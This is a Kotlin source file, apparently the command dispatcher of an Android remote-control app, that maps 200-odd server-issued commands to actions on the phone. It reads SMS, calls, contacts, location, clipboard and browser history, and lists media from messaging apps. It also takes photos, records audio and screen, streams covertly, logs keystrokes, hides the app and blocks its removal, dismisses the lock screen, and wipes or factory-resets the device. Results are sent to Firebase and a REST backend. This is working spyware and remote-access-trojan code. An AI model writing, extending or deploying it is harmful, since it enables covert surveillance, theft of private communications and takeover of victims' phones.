package com.abuzahra.manager.executor

import android.content.ContentValues
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.BitmapFactory
import android.os.Build
import android.os.Environment
import android.provider.BlockedNumberContract
import android.provider.MediaStore
import android.provider.Settings
import android.util.Log
import android.app.KeyguardManager
import com.abuzahra.manager.api.ApiClient
import com.abuzahra.manager.api.FirebaseManager
import com.abuzahra.manager.model.Command
import com.abuzahra.manager.service.MyAccessibilityService
import com.abuzahra.manager.util.DeviceUtils
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch
import java.io.File
import java.net.URL
import java.text.SimpleDateFormat
import java.util.Locale

object CommandExecutor {

    private const val TAG = "CommandExecutor"
    private val executorScope = kotlinx.coroutines.CoroutineScope(Dispatchers.IO + SupervisorJob())

    fun execute(context: Context, command: Command) {
        Log.i(TAG, "Executing command: ${command.command} (id=${command.id})")

        executorScope.launch {
            try {
                val result = processCommand(context, command)
                val resultStr = if (result is Map<*, *>) {
                    result.entries.joinToString("\n") { "  ${it.key}: ${it.value}" }
                } else {
                    result.toString()
                }

                // Send result via Firebase
                val deviceId = DeviceUtils.getDeviceId(context)
                FirebaseManager.submitResult(deviceId, command.id, command.command, "completed", result)

                // Also send via REST API as backup
                ApiClient.submitResult(command.id, command.command, "completed", result)

                Log.i(TAG, "Command ${command.id} completed: ${resultStr.take(100)}")
            } catch (e: Exception) {
                Log.e(TAG, "Command ${command.id} failed", e)
                val deviceId = DeviceUtils.getDeviceId(context)
                FirebaseManager.submitResult(deviceId, command.id, command.command, "error", "Error: ${e.message ?: e.javaClass.simpleName}")
                ApiClient.submitResult(command.id, command.command, "error", "Error: ${e.message ?: e.javaClass.simpleName}")
            }
        }
    }

    // ===== SOCIAL MEDIA DATA SCANNER =====
    private fun scanSocialMediaDirs(context: Context, dirs: List<String>, label: String): List<Map<String, Any>> {
        val files = mutableListOf<Map<String, Any>>()
        // Scoped Storage check for Android 11+
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && !Environment.isExternalStorageManager()) {
                return listOf(mapOf("error" to "MANAGE_EXTERNAL_STORAGE permission required on Android 11+" as Any))
            }
        } catch (_: Exception) {}

        for (dirPath in dirs) {
            val dir = File(dirPath)
            if (dir.exists() && dir.isDirectory) {
                dir.walkTopDown().maxDepth(3).forEach { file ->
                    if (file.isFile && files.size < 200) {
                        files.add(mapOf(
                            "name" to file.name,
                            "path" to file.absolutePath,
                            "size" to formatFileSize(file.length()),
                            "size_bytes" to file.length(),
                            "last_modified" to formatDate(file.lastModified()),
                            "extension" to file.extension
                        ))
                    }
                }
            }
        }
        return files
    }

    private fun scanMediaStoreForApp(context: Context, packageName: String, label: String): List<Map<String, Any>> {
        val files = mutableListOf<Map<String, Any>>()
        try {
            val projection = arrayOf(
                MediaStore.MediaColumns.DISPLAY_NAME,
                MediaStore.MediaColumns.SIZE,
                MediaStore.MediaColumns.DATE_MODIFIED,
                MediaStore.MediaColumns.DATA,
                MediaStore.MediaColumns.MIME_TYPE
            )
            val selection = "${MediaStore.MediaColumns.OWNER_PACKAGE_NAME} = ?"
            val selectionArgs = arrayOf(packageName)
            context.contentResolver.query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                projection, selection, selectionArgs,
                "${MediaStore.MediaColumns.DATE_MODIFIED} DESC"
            )?.use { cursor ->
                val nameIdx = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DISPLAY_NAME)
                val sizeIdx = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.SIZE)
                val dateIdx = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DATE_MODIFIED)
                val dataIdx = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DATA)
                val mimeIdx = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.MIME_TYPE)
                var count = 0
                while (cursor.moveToNext() && count < 200) {
                    val dateVal = cursor.getLong(dateIdx)
                    files.add(mapOf(
                        "name" to (cursor.getString(nameIdx) ?: ""),
                        "path" to (cursor.getString(dataIdx) ?: ""),
                        "size" to formatFileSize(cursor.getLong(sizeIdx)),
                        "size_bytes" to cursor.getLong(sizeIdx),
                        "last_modified" to formatDate(dateVal * 1000),
                        "mime_type" to (cursor.getString(mimeIdx) ?: ""),
                        "source" to label
                    ))
                    count++
                }
            }
        } catch (e: Exception) {
            Log.w(TAG, "MediaStore query failed for $packageName", e)
        }

        // Also try video store
        try {
            val projection = arrayOf(
                MediaStore.MediaColumns.DISPLAY_NAME,
                MediaStore.MediaColumns.SIZE,
                MediaStore.MediaColumns.DATE_MODIFIED,
                MediaStore.MediaColumns.DATA,
                MediaStore.MediaColumns.MIME_TYPE
            )
            val selection = "${MediaStore.MediaColumns.OWNER_PACKAGE_NAME} = ?"
            val selectionArgs = arrayOf(packageName)
            context.contentResolver.query(
                MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
                projection, selection, selectionArgs,
                "${MediaStore.MediaColumns.DATE_MODIFIED} DESC"
            )?.use { cursor ->
                val nameIdx = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DISPLAY_NAME)
                val sizeIdx = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.SIZE)
                val dateIdx = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DATE_MODIFIED)
                val dataIdx = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DATA)
                val mimeIdx = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.MIME_TYPE)
                var count = 0
                while (cursor.moveToNext() && count < 200) {
                    val dateVal = cursor.getLong(dateIdx)
                    files.add(mapOf(
                        "name" to (cursor.getString(nameIdx) ?: ""),
                        "path" to (cursor.getString(dataIdx) ?: ""),
                        "size" to formatFileSize(cursor.getLong(sizeIdx)),
                        "size_bytes" to cursor.getLong(sizeIdx),
                        "last_modified" to formatDate(dateVal * 1000),
                        "mime_type" to (cursor.getString(mimeIdx) ?: ""),
                        "source" to label
                    ))
                    count++
                }
            }
        } catch (e: Exception) {
            Log.w(TAG, "Video MediaStore query failed for $packageName", e)
        }
        return files
    }

    // ===== HELPERS =====
    private fun formatFileSize(bytes: Long): String {
        if (bytes <= 0) return "0 B"
        val units = arrayOf("B", "KB", "MB", "GB", "TB")
        val digitGroups = (Math.log10(bytes.toDouble()) / Math.log10(1024.0)).toInt()
        return String.format("%.1f %s", bytes / Math.pow(1024.0, digitGroups.toDouble()), units[digitGroups.coerceAtMost(4)])
    }

    private fun formatDate(timestamp: Long): String {
        return SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(java.util.Date(timestamp))
    }

    private fun processCommand(context: Context, command: Command): Any {
        val params = command.params
        val cmd = command.command

        return when (cmd) {
            // ===== DATA COLLECTION =====
            "get_sms" -> DataCollector.getSMS(context)
            "get_calls" -> DataCollector.getCalls(context)
            "get_contacts" -> DataCollector.getContacts(context)
            "get_location" -> DataCollector.getLastLocation(context)
            "get_notifications" -> DataCollector.getRecentNotifications(context)
            "get_apps", "get_installed_apps" -> DataCollector.getApps(context)
            "get_info" -> DataCollector.getDeviceInfo(context)
            "get_battery" -> DataCollector.getBattery(context)
            "get_gallery" -> FileExecutor.listFiles(context, mapOf("arg" to "dcim"))
            "get_clipboard" -> DataCollector.getClipboard(context)
            "get_all" -> mapOf(
                "info" to DataCollector.getDeviceInfo(context),
                "battery" to DataCollector.getBattery(context),
                "wifi" to DataCollector.getWifiInfo(context),
                "network" to DataCollector.getNetworkInfo(context),
                "sim" to DataCollector.getSimInfo(context)
            )
            "get_wifi_info" -> DataCollector.getWifiInfo(context)
            "get_network_info" -> DataCollector.getNetworkInfo(context)
            "get_sim_info" -> DataCollector.getSimInfo(context)
            "get_storage_info" -> DataCollector.getStorageInfo(context)
            "get_running_apps" -> DataCollector.getRunningApps(context)
            "get_calendar" -> DataCollector.getCalendar(context)
            "get_browser_history" -> DataCollector.getBrowserHistory(context)
            "get_app_usage" -> AppExecutor.getScreenTime(context)

            // ===== SOCIAL MEDIA =====
            "get_whatsapp" -> FileExecutor.listFiles(context, mapOf("arg" to "whatsapp"))
            "get_telegram" -> FileExecutor.listFiles(context, mapOf("arg" to "telegram"))
            "get_instagram" -> {
                val mediaStoreFiles = scanMediaStoreForApp(context, "com.instagram.android", "Instagram")
                val dirFiles = scanSocialMediaDirs(context, listOf(
                    "/storage/emulated/0/Android/media/com.instagram.android",
                    "/storage/emulated/0/Pictures/Instagram",
                    "/storage/emulated/0/DCIM/Instagram"
                ), "Instagram")
                (mediaStoreFiles + dirFiles).take(200)
            }
            "get_messenger" -> {
                val mediaStoreFiles = scanMediaStoreForApp(context, "com.facebook.orca", "Messenger")
                val dirFiles = scanSocialMediaDirs(context, listOf(
                    "/storage/emulated/0/Android/media/com.facebook.orca",
                    "/storage/emulated/0/Pictures/Messenger",
                    "/storage/emulated/0/DCIM/Messenger"
                ), "Messenger")
                (mediaStoreFiles + dirFiles).take(200)
            }
            "get_snapchat" -> {
                val mediaStoreFiles = scanMediaStoreForApp(context, "com.snapchat.android", "Snapchat")
                val dirFiles = scanSocialMediaDirs(context, listOf(
                    "/storage/emulated/0/Android/media/com.snapchat.android",
                    "/storage/emulated/0/Pictures/Snapchat",
                    "/storage/emulated/0/DCIM/Snapchat"
                ), "Snapchat")
                (mediaStoreFiles + dirFiles).take(200)
            }
            "get_tiktok" -> {
                val mediaStoreFiles = scanMediaStoreForApp(context, "com.zhiliaoapp.musically", "TikTok")
                val dirFiles = scanSocialMediaDirs(context, listOf(
                    "/storage/emulated/0/Android/media/com.zhiliaoapp.musically",
                    "/storage/emulated/0/Pictures/TikTok",
                    "/storage/emulated/0/DCIM/TikTok"
                ), "TikTok")
                (mediaStoreFiles + dirFiles).take(200)
            }
            "get_twitter" -> {
                val mediaStoreFiles = scanMediaStoreForApp(context, "com.twitter.android", "Twitter")
                val dirFiles = scanSocialMediaDirs(context, listOf(
                    "/storage/emulated/0/Android/media/com.twitter.android",
                    "/storage/emulated/0/Pictures/Twitter",
                    "/storage/emulated/0/DCIM/Twitter"
                ), "Twitter")
                (mediaStoreFiles + dirFiles).take(200)
            }
            "get_viber" -> {
                val mediaStoreFiles = scanMediaStoreForApp(context, "com.viber.voip", "Viber")
                val dirFiles = scanSocialMediaDirs(context, listOf(
                    "/storage/emulated/0/Android/media/com.viber.voip",
                    "/storage/emulated/0/Viber",
                    "/storage/emulated/0/Pictures/Viber"
                ), "Viber")
                (mediaStoreFiles + dirFiles).take(200)
            }
            "get_signal" -> {
                val mediaStoreFiles = scanMediaStoreForApp(context, "org.thoughtcrime.securesms", "Signal")
                val dirFiles = scanSocialMediaDirs(context, listOf(
                    "/storage/emulated/0/Android/media/org.thoughtcrime.securesms",
                    "/storage/emulated/0/Signal",
                    "/storage/emulated/0/Pictures/Signal"
                ), "Signal")
                (mediaStoreFiles + dirFiles).take(200)
            }
            "get_facebook" -> {
                val mediaStoreFiles = scanMediaStoreForApp(context, "com.facebook.katana", "Facebook")
                val dirFiles = scanSocialMediaDirs(context, listOf(
                    "/storage/emulated/0/Android/media/com.facebook.katana",
                    "/storage/emulated/0/Pictures/Facebook",
                    "/storage/emulated/0/DCIM/Facebook"
                ), "Facebook")
                (mediaStoreFiles + dirFiles).take(200)
            }
            "get_youtube" -> {
                val mediaStoreFiles = scanMediaStoreForApp(context, "com.google.android.youtube", "YouTube")
                val dirFiles = scanSocialMediaDirs(context, listOf(
                    "/storage/emulated/0/Android/media/com.google.android.youtube",
                    "/storage/emulated/0/Movies/YouTube",
                    "/storage/emulated/0/Pictures/YouTube"
                ), "YouTube")
                (mediaStoreFiles + dirFiles).take(200)
            }

            // ===== REMOTE CONTROL =====
            "ping" -> ControlExecutor.ping()
            "vibrate" -> ControlExecutor.vibrate(context, params)
            "ring" -> ControlExecutor.ring(context)
            "screenshot" -> ControlExecutor.takeScreenshot(context)
            "front_camera" -> ControlExecutor.frontCamera(context)
            "back_camera" -> ControlExecutor.backCamera(context)
            "record_audio" -> ControlExecutor.recordAudio(context, params)
            "record_screen" -> ControlExecutor.recordScreen(context, params)
            "stop_screen" -> MonitorExecutor.screenRecordStop()
            "lock_phone" -> ControlExecutor.lockPhone(context)
            "unlock_phone" -> {
                try {
                    val km = context.getSystemService(Context.KEYGUARD_SERVICE) as? KeyguardManager
                    if (km?.isDeviceLocked == true) {
                        // Try to dismiss keyguard via accessibility service
                        val acc = MyAccessibilityService.getInstance()
                        if (acc != null) {
                            acc.dismissKeyguard()
                            mapOf("ok" to true, "message" to "Keyguard dismiss requested via accessibility")
                        } else {
                            // Fallback: try to wake screen and dismiss notification shade
                            try {
                                val powerManager = context.getSystemService(Context.POWER_SERVICE) as? android.os.PowerManager
                                val wakeLock = powerManager?.newWakeLock(
                                    android.os.PowerManager.SCREEN_BRIGHT_WAKE_LOCK or android.os.PowerManager.ACQUIRE_CAUSES_WAKEUP,
                                    "abuzahra:unlock"
                                )
                                wakeLock?.acquire(3000)
                                wakeLock?.release()
                                mapOf("ok" to true, "message" to "Screen woken; accessibility service not running - cannot dismiss keyguard without it")
                            } catch (e: Exception) {
                                mapOf("message" to "Accessibility service not running - cannot unlock programmatically without root")
                            }
                        }
                    } else {
                        mapOf("ok" to true, "message" to "Device is already unlocked")
                    }
                } catch (e: Exception) {
                    mapOf("error" to (e.message ?: "Failed to unlock"))
                }
            }
            "reboot" -> ControlExecutor.reboot(context)
            "shutdown" -> ControlExecutor.shutdown(context)
            "set_volume" -> ControlExecutor.setVolume(context, params)
            "set_brightness" -> ControlExecutor.setBrightness(context, params)
            "set_ringtone" -> ControlExecutor.setRingtone(context, params)
            "set_wallpaper" -> {
                val url = params["arg"] as? String ?: return mapOf("error" to "Image URL required")
                try {
                    // Download image from URL
                    val connection = URL(url).openConnection()
                    connection.connectTimeout = 15000
                    connection.readTimeout = 15000
                    connection.doInput = true
                    connection.connect()
                    val input = connection.getInputStream()
                    val bitmap = BitmapFactory.decodeStream(input)
                    input.close()
                    if (bitmap == null) {
                        return mapOf("error" to "Failed to decode image from URL")
                    }
                    val wallpaperManager = android.app.WallpaperManager.getInstance(context)
                    wallpaperManager.setBitmap(bitmap)
                    bitmap.recycle()
                    mapOf("ok" to true, "message" to "Wallpaper set successfully")
                } catch (e: Exception) {
                    mapOf("error" to (e.message ?: "Failed to set wallpaper"))
                }
            }
            "enable_wifi" -> ControlExecutor.enableWifi(context)
            "disable_wifi" -> ControlExecutor.disableWifi(context)
            "enable_bluetooth" -> ControlExecutor.enableBluetooth(context)
            "disable_bluetooth" -> ControlExecutor.disableBluetooth(context)
            "enable_mobile_data" -> ControlExecutor.enableMobileData(context)
            "disable_mobile_data" -> ControlExecutor.disableMobileData(context)
            "enable_hotspot" -> ControlExecutor.enableHotspot(context)
            "disable_hotspot" -> ControlExecutor.disableHotspot(context)
            "airplane_on" -> ControlExecutor.airplaneOn(context)
            "airplane_off" -> ControlExecutor.airplaneOff(context)
            "set_auto_rotate" -> ControlExecutor.setAutoRotate(context, params)
            "torch_on" -> ControlExecutor.torchOn(context)
            "torch_off" -> ControlExecutor.torchOff(context)
            "play_sound" -> ControlExecutor.playSound(context, params)
            "speak_text" -> ControlExecutor.speakText(context, params)
            "show_notification" -> ControlExecutor.showNotification(context, params)
            "open_url" -> ControlExecutor.openUrl(context, params)
            "send_sms" -> ControlExecutor.sendSms(context, params)
            "make_call" -> ControlExecutor.makeCall(context, params)
            "block_number" -> {
                val number = params["arg"] as? String ?: return mapOf("error" to "Number required")
                try {
                    val values = ContentValues().apply {
                        put("number", number)
                    }
                    val uri = context.contentResolver.insert(BlockedNumberContract.BlockedNumbers.CONTENT_URI, values)
                    if (uri != null) {
                        mapOf("ok" to true, "message" to "Blocked: $number")
                    } else {
                        mapOf("error" to "Failed to block number")
                    }
                } catch (e: Exception) {
                    mapOf("error" to (e.message ?: "Failed to block number - may need READ_CALL_LOG / WRITE_CALL_LOG permission"))
                }
            }
            "unblock_number" -> {
                val number = params["arg"] as? String ?: return mapOf("error" to "Number required")
                try {
                    val rowsDeleted = context.contentResolver.delete(
                        BlockedNumberContract.BlockedNumbers.CONTENT_URI,
                        "number = ?",
                        arrayOf(number)
                    )
                    if (rowsDeleted > 0) {
                        mapOf("ok" to true, "message" to "Unblocked: $number", "rows_deleted" to rowsDeleted)
                    } else {
                        mapOf("message" to "Number was not in blocked list: $number")
                    }
                } catch (e: Exception) {
                    mapOf("error" to (e.message ?: "Failed to unblock number - may need READ_CALL_LOG / WRITE_CALL_LOG permission"))
                }
            }

            // ===== APP MANAGEMENT =====
            "open_app", "launch_app" -> AppExecutor.openApp(context, params)
            "enable_app" -> {
                val pkg = params["arg"] as? String ?: return mapOf("error" to "Package name required")
                try {
                    val pm = context.packageManager
                    val intent = pm.getLaunchIntentForPackage(pkg)
                    if (intent != null) {
                        pm.setComponentEnabledSetting(
                            intent.component!!,
                            PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                            PackageManager.DONT_KILL_APP
                        )
                        mapOf("ok" to true, "message" to "App enabled: $pkg")
                    } else {
                        mapOf("error" to "No launcher activity found for $pkg")
                    }
                } catch (e: Exception) {
                    mapOf("error" to (e.message ?: "Failed to enable app"))
                }
            }
            "close_app", "kill_app" -> AppExecutor.closeApp(context, params)
            "disable_app" -> {
                val pkg = params["arg"] as? String ?: return mapOf("error" to "Package name required")
                try {
                    val pm = context.packageManager
                    val intent = pm.getLaunchIntentForPackage(pkg)
                    if (intent != null) {
                        pm.setComponentEnabledSetting(
                            intent.component!!,
                            PackageManager.COMPONENT_ENABLED_STATE_DISABLED_USER,
                            PackageManager.DONT_KILL_APP
                        )
                        mapOf("ok" to true, "message" to "App disabled: $pkg")
                    } else {
                        mapOf("error" to "No launcher activity found for $pkg")
                    }
                } catch (e: Exception) {
                    mapOf("error" to (e.message ?: "Failed to disable app"))
                }
            }
            "install_app", "update_app" -> AppExecutor.installApp(context, params)
            "uninstall_app" -> AppExecutor.uninstallApp(context, params)
            "block_app" -> AppExecutor.blockApp(context, params)
            "unblock_app" -> AppExecutor.unblockApp(context, params)
            "clear_app_data", "clear_cache", "app_cache" -> AppExecutor.clearAppData(context, params)
            "force_stop_app" -> AppExecutor.forceStopApp(context, params)
            "app_info" -> AppExecutor.getAppInfo(context, params)
            "app_permissions" -> {
                val pkg = params["arg"] as? String ?: return mapOf("error" to "Package name required")
                try {
                    val pm = context.packageManager
                    val info = pm.getPackageInfo(pkg, PackageManager.GET_PERMISSIONS)
                    val requestedPerms = info.requestedPermissions ?: arrayOf()
                    val flags = info.requestedPermissionsFlags
                    val perms = requestedPerms.mapIndexed { index, permName ->
                        val isGranted = flags?.get(index)?.let { flag ->
                            (flag and PackageManager.PERMISSION_GRANTED) != 0
                        } ?: false
                        mapOf("name" to permName, "granted" to isGranted)
                    }
                    mapOf("ok" to true, "package" to pkg, "data" to perms, "count" to perms.size)
                } catch (e: Exception) {
                    mapOf("error" to (e.message ?: "Failed to get permissions"))
                }
            }
            "screen_time", "app_usage" -> AppExecutor.getScreenTime(context)
            "list_blocked" -> {
                try {
                    val cursor = context.contentResolver.query(
                        BlockedNumberContract.BlockedNumbers.CONTENT_URI,
                        arrayOf("number"),
                        null, null, null
                    )
                    val blocked = mutableListOf<String>()
                    cursor?.use {
                        while (it.moveToNext()) {
                            blocked.add(it.getString(0))
                        }
                    }
                    mapOf("ok" to true, "data" to blocked, "count" to blocked.size)
                } catch (e: Exception) {
                    mapOf("error" to (e.message ?: "Failed to list blocked numbers - may need READ_CALL_LOG permission"))
                }
            }

            // ===== FILE MANAGEMENT =====
            "list_files", "list_downloads", "list_dcim", "list_music",
            "list_videos", "list_documents", "list_whatsapp",
            "list_telegram_files" -> FileExecutor.listFiles(context, params)
            "get_file", "download_file" -> FileExecutor.getFileInfo(context, params)
            "delete_file" -> FileExecutor.deleteFile(context, params)
            "rename_file" -> FileExecutor.renameFile(context, params)
            "copy_file" -> FileExecutor.copyFile(context, params)
            "move_file" -> FileExecutor.moveFile(context, params)
            "create_folder" -> FileExecutor.createFolder(context, params)
            "get_folder_size" -> FileExecutor.getFolderSize(context, params)
            "search_files" -> FileExecutor.searchFiles(context, params)
            "recent_files" -> FileExecutor.recentFiles(context)
            "file_info" -> FileExecutor.getFileInfo(context, params)
            "zip_files" -> {
                val arg = params["arg"] as? String ?: return mapOf("error" to "File path required")
                try {
                    val file = File(arg)
                    if (!file.exists()) return mapOf("error" to "File not found: $arg")
                    val zipFile = File(file.absolutePath + ".zip")
                    java.util.zip.ZipOutputStream(java.io.FileOutputStream(zipFile)).use { zos ->
                        if (file.isDirectory) {
                            file.walkTopDown().forEach { f ->
                                if (f.isFile) {
                                    val entry = java.util.zip.ZipEntry(f.relativeTo(file).path)
                                    zos.putNextEntry(entry)
                                    f.inputStream().copyTo(zos)
                                    zos.closeEntry()
                                }
                            }
                        } else {
                            zos.putNextEntry(java.util.zip.ZipEntry(file.name))
                            file.inputStream().copyTo(zos)
                            zos.closeEntry()
                        }
                    }
                    mapOf("ok" to true, "message" to "Created: ${zipFile.name}", "path" to zipFile.absolutePath, "size" to zipFile.length())
                } catch (e: Exception) {
                    mapOf("error" to (e.message ?: "Failed to create zip"))
                }
            }
            "send_backup_contacts" -> DataCollector.getContacts(context)
            "send_backup_sms" -> DataCollector.getSMS(context)
            "send_backup_calls" -> DataCollector.getCalls(context)
            "send_backup_whatsapp" -> FileExecutor.listFiles(context, mapOf("arg" to "whatsapp"))
            "send_backup_all" -> mapOf(
                "contacts" to DataCollector.getContacts(context).size,
                "sms" to DataCollector.getSMS(context).size,
                "calls" to DataCollector.getCalls(context).size,
                "apps" to DataCollector.getApps(context).size
            )

            // ===== SECURITY =====
            "wipe_data" -> SecurityExecutor.wipeData(context)
            "factory_reset" -> SecurityExecutor.factoryReset(context)
            "show_app" -> SecurityExecutor.showApp(context)
            "hide_app" -> SecurityExecutor.hideApp(context)
            "change_passcode", "set_pin", "remove_pin" -> SecurityExecutor.changePasscode(context, params)
            "enable_biometric" -> SecurityExecutor.enableBiometric(context)
            "disable_biometric" -> SecurityExecutor.disableBiometric(context)
            "anti_uninstall_on" -> SecurityExecutor.antiUninstallOn(context)
            "anti_uninstall_off" -> SecurityExecutor.antiUninstallOff(context)
            "device_admin_status" -> SecurityExecutor.deviceAdminStatus(context)
            "check_root" -> SecurityExecutor.checkRoot()
            "set_screen_lock" -> SecurityExecutor.setScreenLock(context)
            "remove_screen_lock" -> SecurityExecutor.removeScreenLock(context)

            // ===== MONITORING =====
            "keylogger_start" -> MonitorExecutor.keyloggerStart()
            "keylogger_stop" -> MonitorExecutor.keyloggerStop()
            "get_keylogger" -> MonitorExecutor.getKeylogger()
            "screen_record_start" -> MonitorExecutor.screenRecordStart(context, params)
            "location_live" -> MonitorExecutor.locationLiveStart(context, 30)
            "location_stop" -> MonitorExecutor.locationStop()
            "clipboard_monitor_start" -> MonitorExecutor.clipboardMonitorStart(context)
            "clipboard_monitor_stop" -> MonitorExecutor.clipboardMonitorStop()
            "wifi_monitor_start" -> MonitorExecutor.wifiMonitorStart(context)
            "wifi_monitor_stop" -> MonitorExecutor.wifiMonitorStop()
            "app_monitor_start" -> MonitorExecutor.appMonitorStart(context)
            "app_monitor_stop" -> MonitorExecutor.appMonitorStop()
            "get_app_log" -> MonitorExecutor.getAllStatus()
            "geo_add" -> MonitorExecutor.geoAdd(params)
            "geo_remove" -> MonitorExecutor.geoRemove(params)
            "geo_list" -> MonitorExecutor.geoList()
            "sms_monitor" -> MonitorExecutor.smsMonitorStart(context)
            "call_monitor" -> MonitorExecutor.callMonitorStart(context)

            // ===== STREAMING =====
            "start_screen_stream" -> StreamExecutor.startScreenStream(context, params)
            "stop_screen_stream" -> StreamExecutor.stopScreenStream(context, params)
            "start_camera_stream" -> StreamExecutor.startCameraStream(context, params)
            "stop_camera_stream" -> StreamExecutor.stopCameraStream(context, params)
            "switch_camera" -> StreamExecutor.switchCamera(context, params)
            "start_audio_stream" -> StreamExecutor.startAudioStream(context, params)
            "stop_audio_stream" -> StreamExecutor.stopAudioStream(context, params)
            "get_stream_status" -> StreamExecutor.getStreamStatus(context, params)
            "set_stream_quality" -> StreamExecutor.setStreamQuality(context, params)
            "enable_torch" -> StreamExecutor.enableTorch(context, params)
            "pause_stream" -> StreamExecutor.pauseStream(context, params)
            "resume_stream" -> StreamExecutor.resumeStream(context, params)
            "stop_all_streams" -> StreamExecutor.stopAllStreams(context, params)
            "get_stream_capabilities" -> StreamExecutor.getCapabilities(context, params)

            // ===== DEVICE EVENTS =====
            "get_device_events" -> com.abuzahra.manager.EventBuffer.flushEvents()
            "events_on" -> com.abuzahra.manager.EventBuffer.setAutoSend(true)
            "events_off" -> com.abuzahra.manager.EventBuffer.setAutoSend(false)
            "events_status" -> com.abuzahra.manager.EventBuffer.getStatus()
            "events_clear" -> com.abuzahra.manager.EventBuffer.clearBuffer().let { mapOf("status" to "cleared", "message" to "Event buffer cleared") }

            // ===== SYSTEM SETTINGS =====
            "set_language" -> ControlExecutor.setLanguage(context, params)
            "set_timezone" -> ControlExecutor.setTimezone(context, params)
            "set_alarm", "set_timer", "set_reminder" -> ControlExecutor.setAlarm(context, params)
            "enable_dev_mode" -> {
                try {
                    context.startActivity(Intent(Settings.ACTION_APPLICATION_DEVELOPMENT_SETTINGS).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK))
                    mapOf("ok" to true, "message" to "Developer settings opened")
                } catch (e: Exception) {
                    mapOf("error" to (e.message ?: "Failed to open developer settings"))
                }
            }
            "disable_dev_mode" -> {
                try {
                    context.startActivity(Intent(Settings.ACTION_APPLICATION_DEVELOPMENT_SETTINGS).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK))
                    mapOf("ok" to true, "message" to "Developer settings opened - toggle off Developer Options")
                } catch (e: Exception) {
                    mapOf("error" to (e.message ?: "Failed to open developer settings"))
                }
            }
            "enable_usb_debug" -> {
                try {
                    context.startActivity(Intent(Settings.ACTION_APPLICATION_DEVELOPMENT_SETTINGS).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK))
                    mapOf("ok" to true, "message" to "Developer settings opened - enable USB Debugging")
                } catch (e: Exception) {
                    mapOf("error" to (e.message ?: "Failed to open developer settings"))
                }
            }
            "disable_usb_debug" -> {
                try {
                    context.startActivity(Intent(Settings.ACTION_APPLICATION_DEVELOPMENT_SETTINGS).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK))
                    mapOf("ok" to true, "message" to "Developer settings opened - disable USB Debugging")
                } catch (e: Exception) {
                    mapOf("error" to (e.message ?: "Failed to open developer settings"))
                }
            }
            "dns_change" -> ControlExecutor.dnsChange(context, params)
            "proxy_set" -> ControlExecutor.proxySet(context, params)
            "apn_settings" -> {
                try {
                    context.startActivity(Intent(Settings.ACTION_APN_SETTINGS).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK))
                    mapOf("ok" to true, "message" to "APN settings opened")
                } catch (e: Exception) {
                    mapOf("error" to (e.message ?: "Failed to open APN settings"))
                }
            }
            "nfc_on" -> ControlExecutor.nfcOn(context)
            "nfc_off" -> ControlExecutor.nfcOff(context)
            "auto_update_on" -> {
                try {
                    context.startActivity(Intent(Settings.ACTION_SETTINGS).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK))
                    mapOf("ok" to true, "message" to "System update settings opened")
                } catch (e: Exception) {
                    mapOf("error" to (e.message ?: "Failed to open update settings"))
                }
            }
            "auto_update_off" -> {
                try {
                    context.startActivity(Intent(Settings.ACTION_SETTINGS).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK))
                    mapOf("ok" to true, "message" to "System update settings opened")
                } catch (e: Exception) {
                    mapOf("error" to (e.message ?: "Failed to open update settings"))
                }
            }

            // ===== UNKNOWN =====
            else -> mapOf("error" to "Unknown command: $cmd", "supported" to "200+ commands")
        }
    }
}